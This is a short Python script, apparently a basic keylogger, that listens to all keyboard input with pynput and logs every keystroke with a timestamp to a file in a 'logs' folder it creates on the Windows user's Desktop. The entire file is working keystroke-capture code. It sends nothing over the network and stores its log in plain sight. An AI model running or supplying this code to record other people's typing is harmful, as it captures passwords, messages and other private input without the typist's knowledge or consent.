import os
from getpass import getuser
from pynput.keyboard import Key,Listener
import logging

laptop_name=str(getuser())

directory = "logs"
parent_dir=f"C:/Users/{laptop_name}/Desktop/"
path = os.path.join(parent_dir, directory)
try:
    os.makedirs(path, exist_ok = True)
except OSError as error:
    exit()

log_dir=f"C:/Users/{laptop_name}/Desktop/logs/"


logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
